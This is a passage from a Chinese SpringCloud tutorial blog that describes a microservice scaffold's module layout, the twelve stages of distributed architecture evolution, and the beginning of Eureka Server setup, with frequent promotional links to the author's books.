│  │  ├─cloud-zipkin      -- 监控中心
│  ├─crazymaker-base  -- 公共基础依赖模块
│  │  ├─base-common     -- 普通的公共依赖，如 utils 类的公共方法
│  │  ├─base-redis      -- 公共的 redis 操作模块 
│  │  ├─base-zookeeper  -- 公共的 zookeeper 操作模块
│  │  ├─base-session    -- 分布式 session 模块
│  │  ├─base-auth       -- 基于 JWT + SpringSecurity 的用户凭证与认证模块
│  │  ├─base-runtime    -- 各 provider 的运行时公共依赖，装配的一些通用 Spring IOC Bean 实例
│  ├─crazymaker-uaa   --业务模块: 用户认证与授权
│  │  ├─uaa-api        -- 用户 DTO、Constants 等
│  │  ├─uaa-client     --  用户服务的 Feign 远程客户端
│  │  ├─uaa-provider   -- 用户认证与权限的实现，包含controller 层、service层、dao层的代码实现
│  ├─crazymaker-seckill  --业务模块: 秒杀练习
│  │  ├─seckill-api        -- 秒杀 DTO、Constants 等
│  │  ├─seckill-client     -- 秒杀服务的 Feign 远程调用模块
│  │  ├─seckill-provider   -- 秒杀服务核心实现，包含controller层、service层、dao层的代码实现
│  ├─crazymaker-demo    --业务模块: 练习演示
│  │  ├─demo-api        -- 演示模块的 DTO、Constants 等
│  │  ├─demo-client     -- 演示模块的 Feign 远程调用模块
│  │  ├─demo-provider   -- 演示模块的核心实现，包含controller层、service层、dao层的代码实现
</code></pre> 
<p>基于 crazy-springcloud 脚手架（其他的脚手架也类似）的微服务开发和自验证过程中，涉及到的基础中间件大致如下：</p> 
<p>（1）ZooKeeper （虚拟机中已经预装）</p> 
<p>ZooKeeper 是一个分布式的、开放源码的分布式协调应用程序，是大数据框架 Hadoop 和 Hbase的重要组件。在分布式应用中，它能够高可用地提供很多保障数据一致性的基础能力：分布式锁、选主、分布式命名服务等。</p> 
<p>在 crazy-springcloud 脚手架中，高性能分布式 ID 生成器用到了 ZooKeeper。有关其原理和使用，请参见《Netty Zookeeper Redis 高并发实战》一书。</p> 
<p>（2）Redis （虚拟机中已经预装）</p> 
<p>Redis 是一个高性能的缓存数据库。在高并发的场景下，Redis 可以对关系数据库起到很好的缓冲作用；在提高系统的并发能力和响应速度方面，Redis 举足轻重和至关重要。crazy-springcloud 脚手架的分布式 Session 用到了 Redis。 有关 Redis 的原理和使用，还是请参见《Netty Zookeeper Redis 高并发实战》一书。</p> 
<p>（3）Eureka （虚拟机中已经预装）</p> 
<p>Eureka 是 Netflix 开发的服务注册和发现框架，本身是一个 REST 服务提供者，主要用于定位运行在 AWS（Amazon 云）的中间层服务，以达到负载均衡和中间层服务故障转移的目的。SpringCloud 将它集成在其子项目 spring-cloud-netflix 中，以实现 SpringCloud 的服务注册和发现功能。</p> 
<p>（4）SpringCloud Config （虚拟机中已经预装）</p> 
<p>SpringCloud Config 是 SpringCloud 全家桶中最早的配置中心，虽然在生产场景中，很多的企业已经使用 Nacos 或者 Consul 整合型的配置中心替代了独立的配置中心，但是 Config 依然适用于 SpringCloud 项目，通过简单的配置即可使用。</p> 
<p>（5） Zuul</p> 
<p>Zuul 是 Netflix 开源网关，可以和 Eureka、Ribbon、Hystrix 等组件配合使用，SpringCloud 对Zuul 进行了整合与增强，使用其作为微服务集群的内部网关，负责对给集群内部各个 provider 服务提供者进行 RPC 路由和请求过滤。</p> 
<p>以上中间件的端口配置，以及部分安装和使用视频，大致如下表所示。</p> 
<table><thead><tr><th>中间件</th><th>链接地址</th></tr></thead><tbody><tr><td>Linux Redis 安装（带视频）</td><td><a href="https://www.cnblogs.com/crazymakercircle/p/11985983.html" rel="nofollow">Linux Redis 安装（带视频）</a></td></tr><tr><td>Linux Zookeeper 安装（带视频）</td><td><a href="https://www.cnblogs.com/crazymakercircle/p/12006500.html" rel="nofollow">Linux Zookeeper 安装, 带视频</a></td></tr><tr><td>…完整的开发环境的准备工作，-&gt;</td><td><a href="https://www.cnblogs.com/crazymakercircle/p/9904544.html" rel="nofollow">请去疯狂创客圈 博客园 总入口 </a></td></tr><tr><td>。。。。</td><td></td></tr></tbody></table> 
<blockquote> 
 <p>注：本文以 PDF 持续更新，最新尼恩 架构笔记、面试题 的PDF文件，请从下面的链接获取：<a href="https://www.yuque.com/crazymakercircle/gkkw8s/khigna" rel="nofollow">语雀</a> 或者 <a href="https://gitee.com/crazymaker/SimpleCrayIM/blob/master/%E7%96%AF%E7%8B%82%E5%88%9B%E5%AE%A2%E5%9C%88%E6%80%BB%E7%9B%AE%E5%BD%95.md" rel="nofollow">码云</a></p> 
</blockquote> 
<p>ok，是不是很简单</p> 
<blockquote> 
 <p>源码请参见 《<strong><a href="https://www.cnblogs.com/crazymakercircle/p/13878143.html" rel="nofollow">Java 高并发核心编程 卷3 加强版，老版本为 SpringCloud Nginx 高并发核心编程</a></strong>》一书源码<br> <strong>虽然SpringCloud 入门很简单，但是原理很复杂， 而且掌握SpringCloud 原理，是成为核心工厂师的必备知识</strong></p> 
</blockquote> 
<h3><a id="_12_765"></a>微服务 分布式系统的架构12次演进</h3> 
<p>在进入实操之前，咱们来点微服务 分布式系统的架构演进。</p> 
<p>在尼恩的 《<strong><a href="https://www.cnblogs.com/crazymakercircle/p/13878143.html" rel="nofollow">Java 高并发核心编程 卷3 加强版，老版本为 SpringCloud Nginx 高并发核心编程</a></strong>》 一书中，对亿级流量的系统架构，做了一个内部的分析。</p> 
<p>本文《SpringCloud Alibaba学习圣经 》与之相配合，介绍一下微服务 分布式系统的架构演进。</p> 
<p>《Java 高并发核心编程 卷3 加强版》的 亿级流量的系统架构， 大家更加要好好看看，可以结合起来看。</p> 
<h4><a id="__779"></a>微服务 分布式系统的几个基础概念</h4> 
<p>在介绍架构之前，为了避免部分读者对架构设计中的一些概念不了解，下面对几个微服务分布式系统中最基础的概念进行介绍。</p> 
<p><strong>1）什么是分布式？</strong></p> 
<p>系统中的多个模块在不同服务器上部署，即可称为分布式系统，如Tomcat和数据库分别部署在不同的服务器上，或两个相同功能的Tomcat分别部署在不同服务器上。</p> 
<p><strong>2）什么是高可用？</strong></p> 
<p>系统中部分节点失效时，其他节点能够接替它继续提供服务，则可认为系统具有高可用性。</p> 
<p><strong>3）什么是集群？</strong></p> 
<p>一个特定领域的软件部署在多台服务器上并作为一个整体提供一类服务，这个整体称为集群。</p> 
<p>如Zookeeper中的Master和Slave分别部署在多台服务器上，共同组成一个整体提供集中配置服务。</p> 
<p>在常见的集群中，客户端往往能够连接任意一个节点获得服务，并且当集群中一个节点掉线时，其他节点往往能够自动的接替它继续提供服务，这时候说明集群具有高可用性。</p> 
<p><strong>4）什么是负载均衡？</strong></p> 
<p>请求发送到系统时，通过某些方式把请求均匀分发到多个节点上，使系统中每个节点能够均匀的处理请求负载，则可认为系统是负载均衡的。</p> 
<p><strong>5）什么是正向代理和反向代理？</strong></p> 
<p>系统内部要访问外部网络时，统一通过一个代理服务器把请求转发出去，在外部网络看来就是代理服务器发起的访问，此时代理服务器实现的是正向代理；</p> 
<p>当外部请求进入系统时，代理服务器把该请求转发到系统中的某台服务器上，对外部请求来说，与之交互的只有代理服务器，此时代理服务器实现的是反向代理。</p> 
<p>简单来说，正向代理是代理服务器代替系统内部来访问外部网络的过程，反向代理是外部请求访问系统时通过代理服务器转发到内部服务器的过程。</p> 
<blockquote> 
 <p>注：本文以 PDF 持续更新，最新尼恩 架构笔记、面试题 的PDF文件，请从下面的链接获取：<a href="https://www.yuque.com/crazymakercircle/gkkw8s/khigna" rel="nofollow">语雀</a> 或者 <a href="https://gitee.com/crazymaker/SimpleCrayIM/blob/master/%E7%96%AF%E7%8B%82%E5%88%9B%E5%AE%A2%E5%9C%88%E6%80%BB%E7%9B%AE%E5%BD%95.md" rel="nofollow">码云</a></p> 
</blockquote> 
<h4><a id="1_817"></a>架构演进1：单机架构</h4> 
<p>在网站最初时，应用数量与用户数都较少，可以把Java应用（主要是Tomcat承载）和数据库部署在同一台服务器上。</p> 
<p>浏览器往发起请求时，首先经过DNS服务器（域名系统）把域名转换为实际IP地址10.102.4.1，浏览器转而访问该IP对应的Tomcat。</p> 
<p>具体的架构图，如下：</p> 
<p><img src="https://images2.imgbox.com/88/16/inZqnhzo_o.png" alt=""></p> 
<p><strong>架构瓶颈：</strong></p> 
<p>随着用户数的增长，Tomcat和数据库之间竞争资源，单机性能不足以支撑业务。</p> 
<h4><a id="2_839"></a>架构演进2：引入缓存架构</h4> 
<p>随着 吞吐量的提升， 不得不引入引入缓存架构。通过缓存能把绝大多数请求在读写数据库前拦截掉，大大降低数据库压力。</p> 
<p>含: 本地缓存和分布式缓存</p> 
<p><img src="https://images2.imgbox.com/7c/a0/KpKsuj6A_o.png" alt=""></p> 
<p>在Tomcat同服务器上或同JVM中增加本地缓存，并在外部增加分布式缓存，缓存热门商品信息或热门商品的html页面等。</p> 
<p><strong>涉及的技术包括：</strong></p> 
<p>使用caffeine 作为本地缓存，使用Redis作为分布式缓存</p> 
<p><strong>架构瓶颈：</strong></p> 
<p>（1）这里会涉及缓存穿透/击穿、缓存雪崩、热点数据集中失效等问题</p> 
<p>（2）这里会涉及缓存一致性的问题</p> 
<p>（3）这里会涉及 hotkey的问题</p> 
<p>有关上面问题的解决方案：</p> 
<p>请参见尼恩的 《100Wqps三级缓存组件实操》+ 《100Wqps Caffeine 底层源码、架构实操实操》</p> 
<h4><a id="3_875"></a>架构演进3：接入层引入反向代理实现负载均衡</h4> 
<p>接下来，缓存抗住了大部分的访问请求，服务层Tomcat上还是吞吐量低，响应逐渐变慢，需要进行架构演进。</p> 
<p>在多台服务器上分别部署Tomcat，使用反向代理软件（Nginx）把请求均匀分发到每个Tomcat中。</p> 
<p><img src="https://images2.imgbox.com/66/81/XrSINREt_o.png" alt=""></p> 
<p>此处假设Tomcat最多支持100个并发，Nginx最多支持50000个并发，那么理论上Nginx把请求分发到500个Tomcat上，就能抗住50000个并发。</p> 
<p>**其中涉及的技术包括：**Nginx、HAProxy，</p> 
<p>两者都是工作在网络第七层的反向代理软件，主要支持http协议，还会涉及session共享、文件上传下载的问题。</p> 
<h4><a id="4_895"></a>架构演进4：数据库读写分离</h4> 
<p>反向代理使服务层的并发量大大增加，但并发量的增长也意味着： 更多请求会穿透到数据库，数据库最终成为瓶颈。</p> 
<p><strong>数据库如何高并发？</strong></p> 
<p>简单的方案：把数据库划分为读库和写库，读库可以有多个，</p> 
<p><strong>读库和写库之间，如何实现数据一致性？</strong></p> 
<p>简单的方案：可以通过DB的同步机制，把写库的数据同步到读库，对于需要查询最新写入数据场景，可通过在缓存中多写一份，通过缓存获得最新数据。</p> 
<p><strong>数据库读写分离的架构如下：</strong></p> 
<p><img src="https://images2.imgbox.com/a7/4a/XYFlL8FM_o.png" alt=""></p> 
<p>其中涉及的技术包括：shardingjdbc ，它是数据库中间件，可通过它来组织数据库的分离读写和分库分表，客户端通过它来访问下层数据库，还会涉及数据同步，数据一致性的问题。</p> 
<p>有关上面分库分表解决方案：</p> 
<p>请参见尼恩的 《10Wqps 日志平台实操》， 对分库分表方案，做了非常详解的架构介绍，并且在实操维度，对其中的核心的组件分布式ID，结合雪花id源码，百度id源码，shardingjdbc id源码，做了深入骨髓的介绍。</p> 
<h4><a id="5_925"></a>架构演进5：数据库按业务分库</h4> 
<p>业务逐渐变多，不同业务之间的访问量差距较大，不同业务直接竞争数据库，相互影响性能。</p> 
<p>随着用户数的增长，单机的写库会逐渐会达到性能瓶颈。</p> 
<p>把不同业务的数据保存到不同的数据库中，使业务之间的资源竞争降低，对于访问量大的业务，可以部署更多的服务器来支撑。</p> 
<p><img src="https://images2.imgbox.com/58/b7/Nn6Pbem8_o.png" alt=""></p> 
<p>有关上面分库分表解决方案：</p> 
<p>请参见尼恩的 《10Wqps 日志平台实操》， 对分库分表方案，做了非常详解的架构介绍，并且在实操维度，对其中的核心的组件分布式ID，结合雪花id源码，百度id源码，shardingjdbc id源码，做了深入骨髓的介绍。</p> 
<h4><a id="6LVSF5_943"></a>架构演进6：使用LVS或F5接入层负载均衡</h4> 
<p>随着吞吐量大于5W，接入层Nginx扛不住了</p> 
<p>由于瓶颈在Nginx，因此无法LVS或F5来实现多个Nginx的负载均衡。</p> 
<p><img src="https://images2.imgbox.com/71/4d/glrLxo2G_o.png" alt=""></p> 
<p>图中的LVS和F5是工作在网络第四层的负载均衡解决方案，区别是：</p> 
<p>(1 ) LVS是软件，运行在操作系统内核态，可对TCP请求或更高层级的网络协议进行转发，因此支持的协议更丰富，并且性能也远高于Nginx，可假设单机的LVS可支持几十万个并发的请求转发；</p> 
<p>(2 ) F5是一种负载均衡硬件，与LVS提供的能力类似，性能比LVS更高，但价格昂贵。</p> 
<p>如果不是财大气粗的guoqi，推荐使用LVS。</p> 
<p>由于LVS是单机版的软件，若LVS所在服务器宕机则会导致整个后端系统都无法访问，因此需要有备用节点。</p> 
<p>LVS 如何高可用呢？</p> 
<p>可使用keepalived软件模拟出虚拟IP，然后把虚拟IP绑定到多台LVS服务器上，浏览器访问虚拟IP时，会被路由器重定向到真实的LVS服务器</p> 
<p>当主LVS服务器宕机时，keepalived软件会自动更新路由器中的路由表，把虚拟IP重定向到另外一台正常的LVS服务器，从而达到LVS服务器高可用的效果。</p> 
<h4><a id="7DNS_975"></a>架构演进7：通过DNS轮询实现机房间的负载均衡</h4> 
<p>由于LVS也是单机的，随着并发数增长到几十万时，LVS服务器最终会达到瓶颈，此时用户数达到千万甚至上亿级别，用户分布在不同的地区，与服务器机房距离不同，导致了访问的延迟会明显不同。</p> 
<p>此时，可以使用 DNS 进行负载均衡：在DNS服务器中可配置一个域名对应多个IP地址，每个IP地址对应到不同的机房里的虚拟IP。</p> 
<p><img src="https://images2.imgbox.com/22/d9/0xcnRTBp_o.png" alt=""></p> 
<p>当用户访问taobao时，DNS服务器会使用轮询策略或其他策略，来选择某个IP供用户访问。</p> 
<p>此方式能实现机房间的负载均衡</p> 
<p>至此，系统可做到机房级别的水平扩展，千万级到亿级的并发量都可通过增加机房来解决，系统入口处的请求并发量不再是问题。</p> 
<p>问题是，光用DNS进行简单的 LVS负载均衡，是不够的。</p> 
<p><strong>所以呢？大部分的大厂应用，都是采用 智能DNS + 接入层流量二次路由的模式， 具体的案例，可以来找尼恩进行交流，这里不做展开。主要是内容太多啦。</strong></p> 
<h4><a id="8NoSQL_998"></a>架构演进8：引入NoSQL数据库和搜索引擎等技术</h4> 
<p>随着数据的丰富程度和业务的发展，检索、分析等需求越来越丰富，单单依靠数据库无法解决如此丰富的需求。</p> 
<p>当数据库中的数据多到一定规模时，数据库就不适用于复杂的查询了，往往只能满足普通查询的场景。</p> 
<p>对于统计报表场景，在数据量大时不一定能跑出结果，而且在跑复杂查询时会导致其他查询变慢</p> 
<p>对于全文检索、可变数据结构等场景，数据库天生不适用，使用 elasticsearch 分布式搜索引擎解决。</p> 
<p>如对于海量文件存储，可通过分布式文件系统hbase解决</p> 
<p><img src="https://images2.imgbox.com/6a/3e/BuYlAIWJ_o.png" alt=""></p> 
<p>对于全文检索场景，可通过搜索引擎如ElasticSearch解决，对于多维分析场景，可通过Kylin或Druid等方案解决。</p> 
<p>当然，引入更多组件同时会提高系统的复杂度，不同的组件保存的数据需要同步，需要考虑一致性的问题，需要有更多的运维手段来管理这些组件等。</p> 
<p><strong>接下来尼恩会讲 云原生+大数据的架构，就是介绍的这套方案。</strong></p> 
<h4><a id="9_1024"></a>架构演进9：大应用拆分为微服务</h4> 
<p>引入更多组件解决了丰富的需求，业务维度能够极大扩充，随之而来的是一个应用中包含了太多的业务代码，业务的升级迭代、部署维护变得困难，效率低下。</p> 
<p>解决方式是，进行 业务的解耦。按照业务板块来划分应用代码，使单个应用的职责更清晰，相互之间可以做到独立升级迭代。</p> 
<p>不同的业务，可以解耦成不同的微服务。</p> 
<p>这样的服务就是所谓的微服务，应用和服务之间通过HTTP、TCP或RPC请求等多种方式来访问公共服务，每个单独的服务都可以由单独的团队来管理。</p> 
<p>此外，可以通过Dubbo、SpringCloud等框架实现服务治理、限流、熔断、降级等功能，提高服务的稳定性和可用性。</p> 
<p>这时候应用之间可能会涉及到一些公共配置，可以通过分布式配置中心 Nacos来解决。</p> 
<p><img src="https://images2.imgbox.com/ab/e5/mrdgUwqG_o.png" alt=""></p> 
<h4><a id="10ESB_1048"></a>架构演进10：引入企业服务总线ESB对微服务进行编排</h4> 
<p>由于不同服务之间存在共用的模块，由微服务单独管理会导致相同代码存在多份，导致公共功能升级时全部应用代码都要跟着升级。</p> 
<p>不同微服务的接口访问方式不同，微服务代码需要适配多种访问方式才能使用，此外，微服务访问微服务，微服务之间也可能相互访问，调用链将会变得非常复杂，逻辑变得混乱。</p> 
<p>在微服务的基础上，以应用为单位，进行微服务的分组，并且引入企业服务总线ESB，对微服务进行编排，形成应用。</p> 
<p><img src="https://images2.imgbox.com/83/96/51wvoF0j_o.png" alt=""></p> 
<p>通过ESB统一进行访问协议转换，应用统一通过ESB来访问后端服务，服务与服务之间也通过ESB来相互调用，以此降低系统的耦合程度。</p> 
<p>这种微服务编排为多个应用，公共服务单独抽取出来来管理，并使用企业消息总线来解除服务之间耦合问题的架构。</p> 
<p><strong>接下来尼恩会讲 ESB架构，就是介绍的这套方案。</strong></p> 
<h4><a id="11_1072"></a>架构演进11：引入容器化技术实现动态扩容和缩容</h4> 
<p>业务不断发展，应用和服务都会不断变多，应用和服务的部署变得复杂，同一台服务器上部署多个服务还要解决运行环境冲突的问题</p> 
<p>此外，对于如大促这类需要动态扩缩容的场景，需要水平扩展服务的性能，就需要在新增的服务上准备运行环境，部署服务等，运维将变得十分困难。</p> 
<p>目前最流行的容器化技术是Docker，最流行的容器管理服务是Kubernetes(K8S)，应用/服务可以打包为Docker镜像，通过K8S来动态分发和部署镜像。</p> 
<p>Docker镜像可理解为一个能运行你的应用/服务的最小的操作系统，里面放着应用/服务的运行代码，运行环境根据实际的需要设置好。</p> 
<p>把整个“操作系统”打包为一个镜像后，就可以分发到需要部署相关服务的机器上，直接启动Docker镜像就可以把服务起起来，使服务的部署和运维变得简单。</p> 
<p>有关 Docker + Kubernetes(K8S) 的内容，请参见尼恩的电子书：</p> 
<p>由于内容确实太多， 所以写多个pdf 电子书：</p> 
<p>(1) <strong>《 Docker 学习圣经 》PDF</strong></p> 
<p>(2) **《 SpringCloud Alibaba 微服务 学习圣经 》**PDF</p> 
<p>使用 Docker + Kubernetes(K8S) 后，在大促的之前，可以在现有的机器集群上划分出服务器来启动Docker镜像，增强服务的性能</p> 
<p><img src="https://images2.imgbox.com/5a/f4/8EIpEj6E_o.png" alt=""></p> 
<p>大促过后就可以关闭镜像，对机器上的其他服务不造成影响。</p> 
<h4><a id="12_1108"></a>架构演进12：以云平台承载系统</h4> 
<p>使用容器化技术后服务动态扩缩容问题得以解决，但是机器还是需要公司自身来管理，在非大促的时候，还是需要闲置着大量的机器资源来应对大促，机器自身成本和运维成本都极高，资源利用率低。</p> 
<p><img src="https://images2.imgbox.com/ec/64/Z09JcIih_o.png" alt=""></p> 
<p>系统可部署到公有云上，利用公有云的海量机器资源，解决动态硬件资源的问题</p> 
<p>在大促的时间段里，在云平台中临时申请更多的资源，<strong>结合Docker和K8S来快速部署服务</strong>，在大促结束后释放资源，真正做到按需付费，资源利用率大大提高，同时大大降低了运维成本。</p> 
<p>所谓的云平台，就是把海量机器资源，通过统一的资源管理，抽象为一个资源整体</p> 
<p>在云平台上可按需动态申请硬件资源（如CPU、内存、网络等），并且之上提供通用的操作系统，提供常用的技术组件（如Hadoop技术栈，MPP数据库等）供用户使用，甚至提供开发好的应用</p> 
<p>用户不需要关心应用内部使用了什么技术，就能够解决需求（如音视频转码服务、邮件服务、个人博客等）。</p> 
<p>在云平台中会涉及如下几个概念：</p> 
<p>IaaS：基础设施即服务。对应于上面所说的机器资源统一为资源整体，可动态申请硬件资源的层面；<br> PaaS：平台即服务。对应于上面所说的提供常用的技术组件方便系统的开发和维护；<br> SaaS：软件即服务。对应于上面所说的提供开发好的应用或服务，按功能或性能要求付费。</p> 
<p>至此：以上所提到的从高并发访问问题，到服务的架构和系统实施的层面都有了各自的解决方案。</p> 
<h4><a id="_1138"></a>架构演进的涉及的核心知识</h4> 
<p>通过以上架构的演进，可以看出：</p> 
<p>（1）开发侧： 重点的知识体系是 SpringCloud + Nginx 的基础架构；</p> 
<p>有关 SpringCloud + Nginx的知识，请阅读本文《SpringCloud Alibaba学习圣经 》和与之相配合的《Java 高并发核心编程 卷3 加强版》</p> 
<p>《Java 高并发核心编程 卷3 加强版》</p> 
<p>（2）运维侧： 重点的知识体系是 docker + k8s 的基础架构；</p> 
<p>有关 docker + k8s 的知识，请阅读本文《docker 学习圣经 》和与之相配合的《K8s 学习圣经》</p> 
<p><strong>搞定这些，应对亿级流量，就具备了基础的知识底座。</strong></p> 
<p>本文，聚焦 SpringCloud 的学习，主要是 SpringCloud Alibaba 的学习。</p> 
<h3><a id="SpringCloud__netflix__1160"></a>SpringCloud netflix 入门</h3> 
<p>要了解 SpringCloud Alibaba ，先得了解 <strong>SpringCloud netflix。</strong></p> 
<p>为啥？ SpringCloud Alibaba 仅仅是在 SpringCloud netflix 的基础上，替换了部分组件。 比如说注册中心，比如RPC组件。</p> 
<p><strong>所以，咱们得从SpringCloud netflix 开始。</strong></p> 
<p>SpringCloud Netflix全家桶是 Pivotal 团队提供的一整套微服务开源解决方案，包括服务注册与发现、配置中心、全链路监控、服务网关、负载均衡、断路器等组件，以上的组件主要通过对 NetFilx的 NetFlix OSS 套件中的组件通过整合完成的，其中，比较重要的整合组件有:</p> 
<p>（1）spring-cloud-netflix-Eureka 注册中心</p> 
<p>（2）spring-cloud-netflix-hystrix RPC保护组件</p> 
<p>（3）spring-cloud-netflix-ribbon 客户端负载均衡组件</p> 
<p>（4）spring-cloud-netflix-zuul 内部网关组件</p> 
<p>（6）spring-cloud-config 配置中心</p> 
<p>SpringCloud 全家桶技术栈除了对 NetFlix OSS的开源组件做整合之外，还有整合了一些选型中立的开源组件。比如，SpringCloud Zookeeper 组件整合了 Zookeeper，提供了另一种方式的服务发现和配置管理。</p> 
<p>SpringCloud 架构中的单体业务服务是基于 SpringBoot 应用进行启动和执行的。SpringBoot 是由 Pivotal 团队提供的全新框架，其设计目的是用来简化新 Spring 应用的初始搭建以及开发过程。SpringCloud 利用 SpringBoot 是什么关系呢？</p> 
<p>（1）首先 SpringCloud 利用 SpringBoot 开发便利性巧妙地简化了分布式系统基础设施的开发；</p> 
<p>（2）其次 SpringBoot 专注于快速方便地开发单体微服务提供者，而 SpringCloud 解决的是各微服务提供者之间的协调治理关系；</p> 
<p>（3）第三 SpringBoot 可以离开 SpringCloud 独立使用开发项目，但是 SpringCloud 离不开SpringBoot，其依赖 SpringBoot 而存在。</p> 
<p>最终，SpringCloud 将 SpringBoot 开发的一个个单体微服务整合并管理起来，为各单体微服务提供配置管理、服务发现、断路器、路由、微代理、事件总线、全局锁、决策竞选、分布式会话等等基础的分布式协助能力。</p> 
<h4><a id="SpringCloud__1194"></a>SpringCloud 开发脚手架</h4> 
<p>无论是单体应用还是分布式应用，如果从零开始开发，都会涉及很多基础性的、重复性的工作需要做，比如用户认证，比如 session 管理等等。有了开发脚手架，这块基础工作就可以省去，直接利用脚手架提供的基础模块，然后按照脚手架的规范进行业务模块的开发即可。</p> 
<p>笔者看了开源平台的不少开源的脚手架，发现很少是可以直接拿来做业务模块开发的，或者封装的过于重量级而不好解耦，或者业务模块分包不清晰而不方便开发，所以，本着简洁和清晰的原则，笔者的发起的疯狂创客圈社群推出了自己的微服务开发脚手架 crazy-springcloud，其大致的模块和功能具体如下：</p> 
<pre><code>crazymaker-server     --  根项目
│  ├─cloud-center     --  微服务的基础设施中心
│  │  ├─cloud-eureka      --  注册中心
│  │  ├─cloud-config      --  配置中心
│  │  ├─cloud-zuul        --  网关服务
│  │  ├─cloud-zipkin      -- 监控中心
│  ├─crazymaker-base  -- 公共基础依赖模块
│  │  ├─base-common     -- 普通的公共依赖，如 utils 类的公共方法
│  │  ├─base-redis      -- 公共的 redis 操作模块 
│  │  ├─base-zookeeper  -- 公共的 zookeeper 操作模块
│  │  ├─base-session    -- 分布式 session 模块
│  │  ├─base-auth       -- 基于 JWT + SpringSecurity 的用户凭证与认证模块
│  │  ├─base-runtime    -- 各 provider 的运行时公共依赖，装配的一些通用 Spring IOC Bean 实例
│  ├─crazymaker-uaa   --业务模块: 用户认证与授权
│  │  ├─uaa-api        -- 用户 DTO、Constants 等
│  │  ├─uaa-client     --  用户服务的 Feign 远程客户端
│  │  ├─uaa-provider   -- 用户认证与权限的实现，包含controller 层、service层、dao层的代码实现
│  ├─crazymaker-seckill  --业务模块: 秒杀练习
│  │  ├─seckill-api        -- 秒杀 DTO、Constants 等
│  │  ├─seckill-client     -- 秒杀服务的 Feign 远程调用模块
│  │  ├─seckill-provider   -- 秒杀服务核心实现，包含controller层、service层、dao层的代码实现
│  ├─crazymaker-demo    --业务模块: 练习演示
│  │  ├─demo-api        -- 演示模块的 DTO、Constants 等
│  │  ├─demo-client     -- 演示模块的 Feign 远程调用模块
│  │  ├─demo-provider   -- 演示模块的核心实现，包含controller层、service层、dao层的代码实现
</code></pre> 
<p>在业务模块如何分包的问题上，实际上大部分企业都有自己的统一规范。crazy-springcloud 脚手架从职责清晰、方便维护、能快速导航代码的角度出发，将每一个业务模块，细分成以下三个子模块：</p> 
<p>（1） {module}-api</p> 
<p>此子模块定义了一些公共的 Constants 业务常量和 DTO 传输对象，该子模块既被业务模块内部依赖，也可能被依赖该业务模块的外部模块所依赖；</p> 
<p>（2） {module}-client</p> 
<p>此子模块定义了一些被外部模块所依赖的 Feign 远程调用客户类，该子模块是专供外部的模块，不能被内部的其他子模块所依赖；</p> 
<p>（3） {module}-provider</p> 
<p>此子模块是整个业务模块的核心，也是一个能够独立启动、运行的服务提供者（Application），该模块包含涉及到业务逻辑的 controller 层、service 层、dao 层的完整代码实现。</p> 
<p>crazy-springcloud 微服务开发脚手架在以下两方面进行了弱化：</p> 
<p>（1）在部署方面对容器的介绍进行了弱化，没有使用 Docker 容器而是使用 Shell 脚本。有多方面的原因：一是本脚手架初心是学习，使用 Shell 脚本而不是 Docker 去部署，方便大家学习 Shell 命令和脚本；二是 Java 和 Docker 其实整合得很好，学习非常容易，可以稍加配置就能做到一键发布，找点资料就可以掌握； 三是部署和运维是一个专门的工作，生产环境的部署、甚至是整个自动化构建和部署的工作，实际上属于运维的专项工作，由专门的运维岗位人员去完成，而部署的核心仍然是 Shell 脚本，所以对于开发人员来说掌握 Shell 脚本才是重中之重。</p> 
<p>（2）对监控软件的介绍进行了弱化。本书没有对链路监控、JVM性能指标、断路器监控软件的使用做专门介绍。有多方面的原因：一是监控的软件太多，如果介绍太全，篇幅又不够，介绍太少，大家又不一定用到； 二是监控软件的使用大多是一些软件的操作步骤和说明，原理性的内容比较少，使用视频的形式会比文字形式知识传递的效果会更好。疯狂创客圈后续可能（但不一定）会推出一些微服务监控方面的教学视频供大家参考，请大家关注社群博客。不论如何，只要掌握了 SpringCloud 核心原理，对那些监控组件使用的掌握，对大家来说基本上都是一碟小菜。</p> 
<h4><a id="Eureka_Server__1250"></a>启动Eureka Server 注册中心</h4> 
<p>Eureka 本身是 Netflix 开源的一款注册中心产品，并且 SpringCloud 提供了相应的集成封装，选择其作为注册中心的讲解实例，是出于以下的原因：</p> 
<p>（1）Eureka 在业界的应用十分广泛（尤其是国外），整个框架也经受住了 Netflix 严酷生产环境的考验。</p> 
<p>（2）除了 Eureka 注册中心，Netflix 的其他服务治理功能也十分强大，包括 Ribbon、Hystrix、Feign、Zuul 等组件，结合到一起组成了一套完整的服务治理框架，使得服务的调用、路由也变得异常容易。</p> 
<p>那么，Netflix 和 SpringCloud 是什么关系呢？</p> 
<p>Netflix 是一家互联网流媒体播放商，是美国视频巨头，访问量非常的大。也正是如此，Netflix 把整体的系统迁移到了微服务架构。并且，Netflix 就把它的几乎整个微服务治理生态中的组件，都开源贡献给了 Java 社区，叫做 Netflix OSS。</p> 
<p>SpringCloud 是 Spring 背后的 Pivotal 公司（由 EMC 和 VMware 联合成立的公司）在 2015 年推出的开源产品，主要对 Netflix 开源组件的进一步封装，方便 Spring 开发人员构建微服务架构的应用。</p> 
<p>SpringCloud Eureka 是 SpringCloud Netflix 微服务套件的一部分，基于 Netflix Eureka 做了二次封装，主要负责完成微服务实例的自动化注册与发现，这也是微服务架构中最为核心和基础的功能。</p> 
<p>Eureka 所治理的每一个微服务实例，被称之为 Provider Instance (提供者实例)。每一个 Provider Instance 微服务实例包含一个 Eureka Client 客户端组件（相当于注册中心客户端组件），其主要的工作为：</p> 
<p>（1）向 Eureka Server 完成 Provider Instance 的注册、续约和下线等操作，主要的注册信息包括服务名、机器 IP、端口号、域名等等。</p> 
<p>（2）向 Eureka Server 获取 Provider Instance 清单，并且缓存在本地。</p> 
<p>一般来说，Eureka Server 作为服务治理应用，会独立地部署和运行。一个 Eureka Server 注册中心应用在新建的时候，首先需要在pom.xml文件中添加上 eureka-server 依赖库。</p> 
<pre><code class="prism language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-cloud-starter-netflix-eureka-server<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

